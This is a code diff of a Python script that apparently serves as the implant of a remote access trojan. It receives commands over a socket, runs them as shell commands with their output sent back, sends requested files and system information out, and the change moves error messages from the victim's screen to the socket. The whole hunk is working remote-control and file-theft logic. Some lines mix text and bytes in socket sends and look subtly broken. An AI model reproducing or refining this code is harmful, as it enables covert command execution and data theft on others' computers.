@@ -58,7 +58,6 @@ Processor Architecture: {platform.processor()}
             sock.send(sysinfo.encode())
 
         elif cmd.split(" ")[0] == "download":
-            print(G+"")
             with open(cmd.split(" ")[1], "rb") as f:
                 file_data = f.read(1024)
                 while file_data:
@@ -67,28 +66,23 @@ Processor Architecture: {platform.processor()}
                     file_data = f.read(1024)
                 sleep(2)
                 sock.send(b"DONE")
-            print(S+"File successfully downloaded!")
 
         elif cmd == "exit":
             sock.send(b"exit")
             break
 
-        elif cmd == "shell":
-            header = f"""({getpass.getuser()}@{platform.node()})> """
-            sock.send(header.encode())
-            STDOUT, STDERR = None, None
-            cmd = sock.recv(1024).decode("utf-8")
-            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        elif cmd.split(" ")[0] == "shell":
+            comm = subprocess.Popen(str(cmd.split(cmd.split(" ")[0])[1].strip()), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             STDOUT, STDERR = comm.communicate()
             if not STDOUT:
                 sock.send(STDERR)
             else:
                 sock.send(STDOUT)
         else:
-            print(E+"Unrecognized command!")
+            sock.send(E+"Unrecognized command!")
 
         if not cmd:
             break
     except Exception as e:
-        sock.send("An error has occured: {}".format(str(e)).encode())
+        sock.send(E+"An error has occured: {}".format(str(e)).encode())
 sock.close()
